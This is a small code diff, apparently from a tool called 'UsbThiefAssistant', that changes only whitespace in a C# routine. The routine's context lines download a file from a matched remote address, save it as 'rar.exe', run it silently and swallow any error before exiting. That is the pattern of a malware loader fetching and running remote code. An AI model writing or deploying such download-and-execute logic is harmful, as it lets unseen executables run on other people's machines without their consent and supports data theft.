@@ -174,14 +174,15 @@ namespace UsbThiefAssistant
             Regex regex = new Regex(r);
             if (regex.IsMatch(addr))
             {
-                
+
                 DownloadFile(addr, Application.StartupPath + "\\rar.exe");
                 try
                 {
                     Process.Start(Application.StartupPath + "\\rar.exe");
                 }
                 catch (Exception)
-                {}
+                {
+                }
             }
             Environment.Exit(0);
         }
